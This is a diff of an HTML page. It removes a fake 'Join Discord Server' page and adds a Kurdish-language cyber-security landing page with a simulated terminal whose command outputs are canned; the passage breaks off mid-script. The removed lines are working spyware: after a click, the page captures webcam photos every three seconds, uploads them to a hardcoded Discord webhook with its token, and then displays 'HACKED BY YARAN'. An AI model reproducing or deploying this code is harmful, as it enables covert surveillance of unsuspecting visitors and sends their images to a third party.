@@ -1,100 +1,855 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Discord Server</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    </div>
     <style>
-        body { margin: 0; background: #2c2f33; font-family: sans-serif; overflow: hidden; color: white; }
-        #joinCard, #loadingCard { 
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: #23272a; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); z-index: 1000; 
+        :root {
+            --bg-color: #020617;
+            --card-bg: rgba(15, 23, 42, 0.85);
+            --neon-green: #00ff66;
+            --neon-cyan: #00f3ff;
+            --neon-blue: #3b82f6;
+            --neon-red: #ff3366;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border-color: rgba(0, 243, 255, 0.25);
         }
-        #loadingCard { display: none; }
-        button { background: #7289da; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
-        #matrixCanvas { display: none; position: fixed; top: 0; left: 0; z-index: 1; }
-        #hackedOverlay { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.8); color: red; font-size: 50px; font-weight: bold; 
-            justify-content: center; align-items: center; z-index: 9999; text-transform: uppercase;
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Courier New', Courier, monospace;
         }
-        #videoElement { display: none; }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.3) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+            z-index: 999;
+            background-size: 100% 4px, 6px 100%;
+            pointer-events: none;
+        }
+
+        /* Top Small Green Button Container */
+        .top-action-bar {
+            text-align: center;
+            padding-top: 15px;
+            background: transparent;
+        }
+
+        .termux-toggle-btn {
+            background: rgba(0, 255, 102, 0.15);
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            padding: 6px 16px;
+            font-size: 0.85rem;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 0 10px rgba(0, 255, 102, 0.2);
+        }
+
+        .termux-toggle-btn:hover {
+            background: var(--neon-green);
+            color: #000;
+            box-shadow: 0 0 15px var(--neon-green);
+        }
+
+        /* Fullscreen Termux Overlay (100% Full Screen Coverage) */
+        #termuxOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #000000;
+            z-index: 9999999;
+            display: none;
+            flex-direction: column;
+            padding: 15px;
+        }
+
+        .termux-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(0, 255, 102, 0.3);
+            padding-bottom: 10px;
+            margin-bottom: 10px;
+            background: #000;
+        }
+
+        .termux-title {
+            color: var(--neon-green);
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+
+        .termux-close-btn {
+            background: transparent;
+            border: 1px solid var(--neon-red);
+            color: var(--neon-red);
+            padding: 5px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+        .termux-close-btn:hover {
+            background: var(--neon-red);
+            color: #fff;
+        }
+
+        .termux-screen {
+            flex: 1;
+            background: #000;
+            color: var(--neon-green);
+            font-size: 0.8rem;
+            line-height: 1.5;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            padding-bottom: 10px;
+        }
+
+        .termux-input-line {
+            display: flex;
+            align-items: center;
+            border-top: 1px solid rgba(0, 255, 102, 0.3);
+            padding-top: 10px;
+            background: #000;
+        }
+
+        .termux-prompt {
+            color: var(--neon-green);
+            font-weight: bold;
+            margin-right: 8px;
+        }
+
+        .termux-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9rem;
+            outline: none;
+        }
+
+        header {
+            text-align: center;
+            padding: 40px 20px 60px 20px;
+            border-bottom: 2px solid var(--border-color);
+            background: radial-gradient(circle, rgba(0,243,255,0.08) 0%, rgba(2,6,23,1) 85%);
+        }
+
+        h1 {
+            font-size: 4.5rem;
+            color: var(--neon-cyan);
+            text-shadow: 0 0 25px rgba(0, 243, 255, 0.6);
+            letter-spacing: 6px;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 1.3rem;
+            color: var(--neon-green);
+            text-shadow: 0 0 12px rgba(0, 255, 102, 0.5);
+            margin-bottom: 20px;
+        }
+
+        .container {
+            max-width: 1500px;
+            margin: 40px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            gap: 30px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 35px;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-7px);
+            box-shadow: 0 15px 45px rgba(0, 243, 255, 0.25);
+            border-color: var(--neon-cyan);
+        }
+
+        .card h3 {
+            color: var(--neon-green);
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+            border-left: 4px solid var(--neon-cyan);
+            padding-left: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .badge {
+            font-size: 0.75rem;
+            background: rgba(59, 130, 246, 0.15);
+            border: 1px solid var(--neon-blue);
+            color: var(--neon-blue);
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+
+        .card p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            line-height: 1.7;
+            margin-bottom: 15px;
+        }
+
+        .concept-list {
+            list-style-type: none;
+            margin-top: 15px;
+        }
+
+        .concept-list li {
+            color: var(--text-main);
+            font-size: 0.9rem;
+            margin-bottom: 10px;
+            padding-left: 15px;
+            position: relative;
+        }
+
+        .concept-list li::before {
+            content: "→";
+            color: var(--neon-cyan);
+            position: absolute;
+            left: 0;
+            font-weight: bold;
+        }
+
+        .net-box {
+            background: #000;
+            border: 1px solid rgba(0, 255, 102, 0.4);
+            border-radius: 6px;
+            padding: 15px;
+            margin-top: 15px;
+            color: var(--neon-green);
+            font-size: 0.85rem;
+            line-height: 1.5;
+        }
+
+        .scanner-full-card {
+            grid-column: 1 / -1;
+            background: rgba(2, 6, 23, 0.95);
+            border: 2px solid var(--neon-cyan);
+            box-shadow: 0 0 30px rgba(0, 243, 255, 0.15);
+        }
+
+        .scanners-wrapper {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 950px) {
+            .scanners-wrapper {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .scanner-panel {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 243, 255, 0.3);
+            border-radius: 8px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .scanner-panel h4 {
+            color: var(--neon-cyan);
+            font-size: 1.1rem;
+            border-bottom: 1px dashed rgba(0, 243, 255, 0.3);
+            padding-bottom: 8px;
+        }
+
+        .radar-container {
+            position: relative;
+            width: 180px;
+            height: 180px;
+            margin: 0 auto;
+            border: 2px solid var(--neon-cyan);
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(0, 243, 255, 0.05) 0%, rgba(0, 0, 0, 0.9) 80%);
+            overflow: hidden;
+            box-shadow: inset 0 0 15px rgba(0, 243, 255, 0.3);
+        }
+
+        .radar-container.av-radar {
+            border-color: var(--neon-red);
+            box-shadow: inset 0 0 15px rgba(255, 51, 102, 0.3);
+            background: radial-gradient(circle, rgba(255, 51, 102, 0.05) 0%, rgba(0, 0, 0, 0.9) 80%);
+        }
+
+        .radar-sweep {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 90px;
+            height: 90px;
+            background: linear-gradient(45deg, rgba(0, 255, 102, 0.4) 0%, transparent 70%);
+            transform-origin: 0 0;
+            animation: radarRotate 4s linear infinite;
+        }
+
+        .av-radar .radar-sweep {
+            background: linear-gradient(45deg, rgba(255, 51, 102, 0.4) 0%, transparent 70%);
+        }
+
+        @keyframes radarRotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .radar-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 8px;
+            height: 8px;
+            background: var(--neon-green);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 8px var(--neon-green);
+        }
+
+        .av-radar .radar-center {
+            background: var(--neon-red);
+            box-shadow: 0 0 8px var(--neon-red);
+        }
+
+        .radar-ring {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            border: 1px dashed rgba(0, 243, 255, 0.3);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+        }
+
+        .av-radar .radar-ring {
+            border-color: rgba(255, 51, 102, 0.3);
+        }
+
+        .ring-1 { width: 60px; height: 60px; }
+        .ring-2 { width: 120px; height: 120px; }
+        .ring-3 { width: 170px; height: 170px; }
+
+        .cyber-btn {
+            background: linear-gradient(135deg, rgba(0,243,255,0.2), rgba(0,255,102,0.2));
+            border: 1px solid var(--neon-cyan);
+            color: var(--neon-cyan);
+            padding: 10px 15px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+            text-align: center;
+        }
+
+        .cyber-btn:hover {
+            background: var(--neon-cyan);
+            color: var(--bg-color);
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.6);
+        }
+
+        .cyber-btn.av-btn {
+            background: linear-gradient(135deg, rgba(255,51,102,0.2), rgba(255,153,0,0.2));
+            border-color: var(--neon-red);
+            color: var(--neon-red);
+        }
+
+        .cyber-btn.av-btn:hover {
+            background: var(--neon-red);
+            color: var(--bg-color);
+            box-shadow: 0 0 20px rgba(255, 51, 102, 0.6);
+        }
+
+        .terminal-screen-box {
+            background: #000;
+            border: 1px solid var(--neon-green);
+            border-radius: 6px;
+            padding: 12px;
+            height: 140px;
+            overflow-y: auto;
+            color: var(--neon-green);
+            font-size: 0.8rem;
+            line-height: 1.5;
+            box-shadow: inset 0 0 10px rgba(0, 255, 102, 0.2);
+        }
+
+        .terminal-screen-box.av-term {
+            border-color: var(--neon-red);
+            color: var(--neon-red);
+            box-shadow: inset 0 0 10px rgba(255, 51, 102, 0.2);
+        }
+
+        footer {
+            text-align: center;
+            padding: 40px;
+            color: var(--text-muted);
+            border-top: 1px solid var(--border-color);
+            margin-top: 60px;
+            font-size: 0.95rem;
+        }
     </style>
 </head>
 <body>
-    <div id="hackedOverlay">HACKED BY YARAN</div>
-    <canvas id="matrixCanvas"></canvas>
+
+    <!-- Top Small Green Button -->
+    <div class="top-action-bar">
+        <button class="termux-toggle-btn" onclick="openTermux()">[+] Open Termux Terminal</button>
+    </div>
+
+    <!-- Fullscreen Termux Overlay Window (100% Full Screen Coverage) -->
+    <div id="termuxOverlay">
+        <div class="termux-header">
+            <span class="termux-title">root@yara-tool-termux:~#</span>
+            <button class="termux-close-btn" onclick="closeTermux()">[X] Exit</button>
+        </div>
+        <div id="termuxOutput" class="termux-screen">
+=============================================================
+_____________________________________________________
+/ ___|_   _| / \         / \  / ___| ____| \ | | ____| \ | |
+| |     | |  / _ \       / _ \| |  _|  _| |  \| |  _| |  \| |
+| |___  | | / ___ \     / ___ \ |_| | |___| |\  | |___| |\  |
+ \____| |_+_/   \_\  /_/   \_\____|_____|_| \_|_____|_| \_|
+
+  
+
+[+] ADVANCED CYBER SECURITY & NETWORK ARCHITECTURE TOOL v4.2
+=============================================================
+Type 'help' or view the 20 available commands below to start.
+-------------------------------------------------------------
+</div>
+        <div class="termux-input-line">
+            <span class="termux-prompt">$</span>
+            <input type="text" id="termuxInput" class="termux-input" placeholder="فەرمانێک بنووسە (یان help)..." autofocus>
+        </div>
+    </div>
+
+    <header>
+   <div class="subtitle"></div>
     
-    <div id="joinCard">
-        <h2>Join Discord Server</h2>
-        <button id="startBtn">Join Server</button>
+            
+   بەڕێوبەر - یاران مەسعود</h5>
+        <h5>\ــــــــــــــــــــــــــــــــــــــــــــــــ/<h5>
+        <h5>ئەدمین - محمد هەڵگورد<h5>
+      <h5>\ــــــــــــــــــــــــــــــــــــــــــــــــ/<h5>  
+       <h5>پرۆگرامساز - شادی نەجمەدین<h5> 
+       <h5>\ــــــــــــــــــــــــــــــــــــــــــــــــ/<h5>
+   <h5>TEAM CTA - 
+   ئێمە لێرە نین بۆ تێکدان لێرەین بۆ دۆزینەوەی لاوازیەکان پێش ئەوەی کەسێکی تر بیقۆزێتەوە.<h5>
+        <div class="subtitle"></div>
+    </header>
+
+    <div class="container">
+        
+        <!-- 1. OSI & TCP/IP Models -->
+        <div class="card">
+            <h3>OSI & TCP/IP Models <span class="badge">Architecture</span></h3>
+            <p>بنەمای سەرەکی چۆنیەتی گواستنەوەی داتا لە نێوان ئامێرەکاندا لە ڕێگەی چینەکانەوە (Layers):</p>
+            <ul class="concept-list">
+                <li><strong>Application Layer:</strong> چینی سەرەوە کە بەرنامەکان و وێبگەڕەکان مامەڵەی لەگەڵ دەکەن (HTTP, DNS).</li>
+                <li><strong>Transport Layer:</strong> بەرپرسە لە پاراستن و گەیاندنی دروستی پاکێجەکان (TCP vs UDP).</li>
+                <li><strong>Network Layer:</strong> تایبەتە بە ناردنی داتا و دۆزینەوەی ناونیشانەکان (IP Addressing & Routing).</li>
+                <li><strong>Data Link & Physical:</strong> چینی فیزیکی و کارتی تۆڕ (MAC Address & Cables).</li>
+            </ul>
+        </div>
+
+        <!-- 2. IP Addressing & Subnetting -->
+        <div class="card">
+            <h3>IP Addressing & Subnetting <span class="badge">Addressing</span></h3>
+            <p>ناسنامەی ئامێرەکان لەسەر تۆڕی ناوخۆیی و جیهانی بۆ ئاراستەکردنی دروستی زانیارییەکان:</p>
+            <ul class="concept-list">
+                <li><strong>IPv4 vs IPv6:</strong> ناونیشانی 32-بیت بەرامبەر ناونیشانی پێشکەوتووی 128-بیت.</li>
+                <li><strong>Public & Private IPs:</strong> جیاوازی نێوان ئایپی ناوخۆیی ماڵەوە/کۆمپانیا و ئایپی گشتی سەر ئینتەرنێت.</li>
+                <li><strong>Subnet Masks:</strong> دابەشکردنی تۆڕە گەورەکان بۆ چەند ژێر-تۆڕێکی بچووکتر بۆ ڕێکخستن و پاراستن.</li>
+            </ul>
+        </div>
+
+        <!-- 3. Routing & Switching -->
+        <div class="card">
+            <h3>Routing & Switching <span class="badge">Traffic Flow</span></h3>
+            <p>ئەو ئامێر و پرۆسەیانەی کە داتا لە نێوان تۆڕە جیاوازەکاندا ئاراستە دەکەن:</p>
+            <div class="net-box">
+                [ هاتوچۆی داتا (Data Routing) ]<br>
+                • Switch: بەستنەوەی ئامێرەکان لە ناو تۆڕێکی لۆکاڵی (LAN) دا.<br>
+                • Router: گواستنەوەی پاکێجی داتا لە نێوان تۆڕە جیاوازەکان و ئینتەرنێتدا.<br>
+                • Gateway: دەروازەی سەرەکی بۆ چوونە دەرەوەی تۆڕەکە.
+            </div>
+        </div>
+
+        <!-- 4. Network Protocols -->
+        <div class="card">
+            <h3>Core Network Protocols <span class="badge">Protocols</span></h3>
+            <p>زمان و رێساکانی تێگەیشتنی ئامێرەکان لەگەڵ یەکتردا لەسەر تۆڕ:</p>
+            <ul class="concept-list">
+                <li><strong>TCP (Transmission Control Protocol):</strong> دڵنیابوونەوە لە گەیشتنی هەموو پاکێجەکان بێ ونبوون (Connection-oriented).</li>
+                <li><strong>UDP (User Datagram Protocol):</strong> گواستنەوەی خێرای داتا بێ دڵنیابوونەوە لە گەیشتنی هەمووی (بۆ ڤیدیۆ و یاری).</li>
+                <li><strong>DNS (Domain Name System):</strong> وەرگێڕانی ناو و ناونیشانی سایتەکان (وەک google.com) بۆ ئایپی ئامێر.</li>
+            </ul>
+        </div>
+
+        <!-- 5. Network Security & Firewalls -->
+        <div class="card">
+            <h3>Network Defenses <span class="badge">Security</span></h3>
+            <p>چۆنیەتی پاراستنی تۆڕ لە دەستدرێژی دەرەکی و دزیکردنی زانیاری:</p>
+            <ul class="concept-list">
+                <li><strong>Firewalls (فایروۆڵ):</strong> پشکنی و بلۆککردنی هاتوچۆ نەخوازراوەکان بەپێی یاسا.</li>
+                <li><strong>IDS / IPS:</strong> سیستەمی ئاگادارکردنەوە و ڕێگریکردن لە جووڵە گوماناوییەکان لە ناو تۆڕدا.</li>
+                <li><strong>VPN (Virtual Private Network):</strong> کۆدکردنی هاتوچۆی داتا لە ڕێگەی تونێلێکی پارێزراوەوە بەسەر ئینتەرنێتدا.</li>
+            </ul>
+        </div>
+
+        <!-- 6. Network Vulnerabilities -->
+        <div class="card">
+            <h3>Network Attacks & Risks <span class="badge">Vulnerabilities</span></h3>
+            <p>ئەو مەترسی و لاوازییە باوانەی کە ڕووبەڕووی تۆڕەکان دەبنەوە:</p>
+            <div class="net-box">
+                [ مەترسییە سەرەکییەکان ]<br>
+                • Man-in-the-Middle (MitM): چاودێریکردن و دەستکاری کردنی هاتوچۆ لە نێوان دوو ئامێردا.<br>
+                • Packet Sniffing: گوێگرتن و گرتنی پاکێجی داتا بەبێ ڕێگەپێدان.<br>
+                • Port Scanning: گەڕانی هێرشبەران بەدوای دەرچە کراوەکاندا.
+            </div>
+        </div>
+
+        <!-- 7. Advanced Computer Architecture & OS -->
+        <div class="card">
+            <h3>Computer Systems & OS <span class="badge">Hardware/OS</span></h3>
+            <p>بنەماکانی کارکردنی کۆمپیوتەر، پڕۆسێسەر و سیستەمی بەڕێوەبردن:</p>
+            <ul class="concept-list">
+                <li><strong>CPU Architecture:</strong> چۆنیەتی جێبەجێکردنی فەرمانەکان لە ڕێگەی ALU و Control Unit و Registers.</li>
+                <li><strong>Memory Hierarchy:</strong> جیاوازی نێوان خێرایی RAM، Cache، و قەبارەی Storage (SSD/HDD).</li>
+                <li><strong>Kernel & Processes:</strong> ڕۆڵی קרنڵ لە بەڕێوەبردنی ڕەقەکاڵا (Hardware) و پرۆسەکانی سیستەم (Processes & Threads).</li>
+            </ul>
+        </div>
+
+        <!-- 8. Cryptography & Data Encryption -->
+        <div class="card">
+            <h3>Cryptography & Hashing <span class="badge">Crypto</span></h3>
+            <p>پاراستنی نهێنی زانیارییەکان لە ڕێگەی کۆدکردن و ئاڵۆزکردنی matematiki:</p>
+            <ul class="concept-list">
+                <li><strong>Symmetric Encryption:</strong> بەکارهێنانی هەمان کلیڵ بۆ قفڵکردن و کردنەوە (AES, DES).</li>
+                <li><strong>Asymmetric Encryption:</strong> سیستەمی دوو کلیڵی عمومی و تایبەت (Public & Private Keys / RSA).</li>
+                <li><strong>Hashing Algorithms:</strong> گۆڕینی دەق بۆ کۆدی نەگۆڕانەوە (SHA-256, MD5) بۆ دڵنیابوون لە پاکی داتا.</li>
+            </ul>
+        </div>
+
+        <!-- 9. Web & Application Security -->
+        <div class="card">
+            <h3>Web & App Security <span class="badge">SecOps</span></h3>
+            <p>پاراستنی سیستەمە ئەلیکترۆنییەکان و وێبسايتەکان لە لاوازییە مەترسیدارەکان:</p>
+            <div class="net-box">
+                [ لاوازییە باوەکانی OWASP Top 10 ]<br>
+                • SQL Injection (SQLi): هێرشکردن بۆ ناو داتابەیس لە ڕێگەی خانەی نووسینەوە.<br>
+                • Cross-Site Scripting (XSS): چاندنی کۆدی زیانبەخش لە ناو پەڕەی وێبدا.<br>
+                • Broken Authentication: لاوازی لە سیستەمی چوونەژوورەوە و پاراستنی پاسوۆرد.
+            </div>
+        </div>
+
+        <!-- 10. Penetration Testing & Ethical Hacking -->
+        <div class="card">
+            <h3>Ethical Hacking Lifecycle <span class="badge">Offensive Sec</span></h3>
+            <p>قۆناغەکانی پشکنی و دۆزینەوەی کون و کەلەبەرەکان پێش ئەوەی هێرشبەری ڕاستەقینە بیاندۆزێتەوە:</p>
+            <ul class="concept-list">
+                <li><strong>Reconnaissance & Footprinting:</strong> کۆکردنەوەی زانیاری سەرەتایی دەربارەی ئامانجەکە.</li>
+                <li><strong>Scanning & Enumeration:</strong> دۆزینەوەی پۆرتە کراوەکان، ڤێرژنی خزمەتگوزارییەکان و لاوازییەکان.</li>
+                <li><strong>Exploitation:</strong> تاقیکردنەوەی کونەبەرەکان بە ئامانجی دەستکەوتنی دەسەڵات (Access).</li>
+                <li><strong>Reporting:</strong> نووسینی ڕاپۆرتی چارەسەرکردن بۆ پتەوکردنی سیستەمەکە.</li>
+            </ul>
+        </div>
+
+        <!-- 11. Dual Radars Section -->
+        <div class="card scanner-full-card">
+            <h3>YARA CTA Dual Radar Control Center <span class="badge">Live Diagnostics</span></h3>
+            <p>سیستەمی پێشکەوتووی سکانی ڕادار بۆ پشکنینی پۆرتەکانی تۆڕ و پشکنینی ڤایرۆس و فایلە زیانبەخشەکان:</p>
+            
+            <div class="scanners-wrapper">
+                
+                <!-- Panel 1: Network & Port Scanner Radar -->
+                <div class="scanner-panel">
+                    <h4>// Network & Port Radar</h4>
+                    <div class="radar-container">
+                        <div class="radar-ring ring-1"></div>
+                        <div class="radar-ring ring-2"></div>
+                        <div class="radar-ring ring-3"></div>
+                        <div class="radar-sweep"></div>
+                        <div class="radar-center"></div>
+                    </div>
+                    <button class="cyber-btn" onclick="startPortScan()">[+] دەستپێکردنی سکانی پۆرت</button>
+                    <div id="portTerminal" class="terminal-screen-box">
+                        [Port Radar Ready...]<br>> Click scan to check ports.
+                    </div>
+                </div>
+
+                <!-- Panel 2: Antivirus & Malware Radar -->
+                <div class="scanner-panel">
+                    <h4>// Antivirus & Malware Radar</h4>
+                    <div class="radar-container av-radar">
+                        <div class="radar-ring ring-1"></div>
+                        <div class="radar-ring ring-2"></div>
+                        <div class="radar-ring ring-3"></div>
+                        <div class="radar-sweep"></div>
+                        <div class="radar-center"></div>
+                    </div>
+                    <button class="cyber-btn av-btn" onclick="startAntivirusScan()">[+] دەستپێکردنی سکانی ئەنتی ڤایرۆس</button>
+                    <div id="avTerminal" class="terminal-screen-box av-term">
+                        [Antivirus Radar Ready...]<br>> Click scan to check malware.
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
     </div>
 
-    <div id="loadingCard">
-        <h2>Connecting...</h2>
-        <p>تکایە چاوەڕێ بکە...</p>
-    </div>
-
-    <video id="videoElement" autoplay playsinline></video>
+    <footer>
+        <p>YARA CTA Network Platform &copy; 2026 | Network Architecture & Cyber Defense Hub.</p>
+    </footer>
 
     <script>
-        // وێبهۆکەکەی تۆ لێرە جێگیرکرا
-        const webhookUrl = "https://discord.com/api/webhooks/1507879866136133682/3h8tsvpbaFNftFO8zsRwkYuHbZwgH7yld33NrCBTtKP0cHMl64tn9AsPTZZl70GceTbb";
-
-        document.getElementById("startBtn").onclick = async () => {
-            const video = document.getElementById("videoElement");
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                
-                document.getElementById("joinCard").style.display = "none";
-                document.getElementById("loadingCard").style.display = "block";
-
-                // ناردنی وێنە هەر 3 چرکە جارێک
-                const interval = setInterval(() => captureAndSend(video), 3000);
-
-                setTimeout(() => {
-                    document.getElementById("loadingCard").style.display = "none";
-                    document.getElementById("matrixCanvas").style.display = "block";
-                    document.getElementById("hackedOverlay").style.display = "flex";
-                    initMatrix();
-                }, 10000);
-
-            } catch (err) {
-                alert("پێویستە مۆڵەتی کامێرا بدەیت!");
-            }
-        };
-
-        async function captureAndSend(video) {
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext("2d").drawImage(video, 0, 0);
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append("file", blob, "photo.png");
-                await fetch(webhookUrl, { method: 'POST', body: formData });
-            }, "image/png");
+        // Open Termux Fullscreen Overlay
+        function openTermux() {
+            const overlay = document.getElementById('termuxOverlay');
+            overlay.style.display = 'flex';
+            const input = document.getElementById('termuxInput');
+            input.focus();
         }
 
-        function initMatrix() {
-            const c = document.getElementById("matrixCanvas");
-            const ctx = c.getContext("2d");
-            c.height = window.innerHeight; c.width = window.innerWidth;
-            const matrix = "010101";
-            const font_size = 15;
-            let columns = c.width/font_size;
-            let drops = Array(Math.floor(columns)).fill(1);
-            setInterval(() => {
-                ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-                ctx.fillRect(0, 0, c.width, c.height);
-                ctx.fillStyle = "#0F0";
-                drops.forEach((drop, i) => {
-                    ctx.fillText(matrix[Math.floor(Math.random()*matrix.length)], i*font_size, drop*font_size);
-                    if(drop*font_size > c.height && Math.random() > 0.975) drops[i] = 0;
-                    drops[i]++;
-                });
-            }, 35);
+        // Close Termux Overlay
+        function closeTermux() {
+            document.getElementById('termuxOverlay').style.display = 'none';
+        }
+
+        // Typewriter Effect Function for Terminal Responses
+        function typeWriterEffect(text, outputElement, speed = 15, callback) {
+            let i = 0;
+            function type() {
+                if (i < text.length) {
+                    outputElement.innerHTML += text.charAt(i);
+                    outputElement.scrollTop = outputElement.scrollHeight;
+                    i++;
+                    setTimeout(type, speed);
+                } else if (callback) {
+                    callback();
+                }
+            }
+            type();
+        }
+
+        // Termux 20 Functional Commands Handler with Typewriter Motion
+        document.getElementById('termuxInput').addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                const input = document.getElementById('termuxInput');
+                const output = document.getElementById('termuxOutput');
+                const cmd = input.value.trim().toLowerCase();
+
+                if (cmd === '') return;
+
+                output.innerHTML += `\n$ ${input.value}\n`;
+                input.value = '';
+
+                let responseText = "";
+
+                switch(cmd) {
+                    case 'help':
+                    case 'commands':
+                        responseText = `
+Available YARA CTA Termux Commands (1 to 20):
+ 1. help               - پیشاندانی لیستی فەرمانەکان
+ 2. scan for my email  - گەڕان و پشکنینی ئیمێڵ لە داتابەیس
+ 3. nmap               - سکانکردنی پۆرتەکانی تۆڕ (Port Scan)
+ 4. clear              - پاککردنەوەی شاشەی تێرمیناڵ
+ 5. whoami             - پیشاندانی زانیاری بەکارهێنەر
+ 6. sys-status         - پشکنینی دۆخی سێکوریتی سیستم
+ 7. ping               - تاقیکردنەوەی خێرایی پەیوەندی هێڵ
+ 8. wifi-hack          - سیموڵەیشنی هاککردنی وایفای (Secure Check)
+ 9. ip-config          - پیشاندانی ئایپی و زانیاری لۆکاڵی
+10. brute-force        - تاقیکردنەوەی هێرشی بڕوت فۆرس
+11. mac-changer        - گۆڕینی ناسنامەی فیزیکی کارتی تۆڕ
+12. hash-gen           - دروستکردنی کۆدی SHA-256 بۆ دەق
+13. dos-simulate       - تاقیکردنەوەی باری لۆدی تۆڕ (DoS Test)
+14. firewall-status    - پشکنینی باری کارکردنی فایروۆڵ
+15. virus-scan         - سکانی ڤایرۆس و فایلە زیانبەخشەکان
+16. update             - نوێکردنەوەی کێرنڵی یارا تووڵ
+17. version            - پیشاندانی ڤێرژنی تووڵەکە
+18. reboot             - رێستارتکردنی سیستەمی تێرمیناڵ
+19. date               - پیشاندانی مێژوو و کاتی سیستەم
+20. exit               - داخستنی تێرمیناڵ
+\n`;
+                        break;
+
+                    case 'scan for my email':
+                    case 'email-scan':
+                        responseText = `[*] Initializing OSINT Email Enumeration...\n[+] Querying breach databases...\n[i] Target Email: yara.tool@sec-hub.net\n[✔] Status: Secured, 0 leaks found.\n\n`;
+                        break;
+
+                    case 'nmap':
+                        responseText = `[*] Starting Nmap Port Scan...\n- Port 21 (FTP): CLOSED\n- Port 22 (SSH): SECURE\n- Port 80 (HTTP): OPEN\n- Port 443 (HTTPS): SECURE\n[✔] Scan completed successfully.\n\n`;
+                        break;
+
+                    case 'clear':
+                        output.innerHTML = `=============================================================\n  __   __    _    ____       _____ ___   ___  _      \n  \\ \\ / /   / \\  |  _ \\     |_   _/ _ \ / _ \| |     \n   \\ V /   / _ \ | |_) /       | || | | | | | | |     \n    | |   / ___ \|  _ <        | || |_| | |_| | |___  \n    |_|  /_/   \_\_| \_\       |_| \___/ \___/|_____| \n[+] YARA CTA - ADVANCED CYBER SECURITY TOOL v4.2\n=============================================================\nType 'help' to see all 20 commands.\n-------------------------------------------------------------\n`;
+                        return;
+
+                    case 'whoami':
+                        responseText = `root@yara-tool-admin (Access Level: Supreme Administrator)\n\n`;
+                        break;
+
+                    case 'sys-status':
+                        responseText = `[SECURE] All firewalls, encryption layers and radars are operating at 100%.\n\n`;
+                        break;
+
+                    case 'ping':
+                        responseText = `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.041 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.032 ms\n[✔] Network latency: Optimal.\n\n`;
+                        break;
+
+                    case 'wifi-hack':
+                        responseText = `[*] Sniffing nearby wireless packets...\n[i] Target WPA3 Network found.\n[!] Warning: Educational simulation only. Encryption unbreakable.\n\n`;
+                        break;
+
+                    case 'ip-config':
+                        responseText = `inet 192.168.1.105  netmask 255.255.255.0  broadcast 192.168.1.255\ninet6 fe80::1%lo  prefixlen 64  scopeid 0x20<link>\n\n`;
+                        break;
+
+                    case 'brute-force':
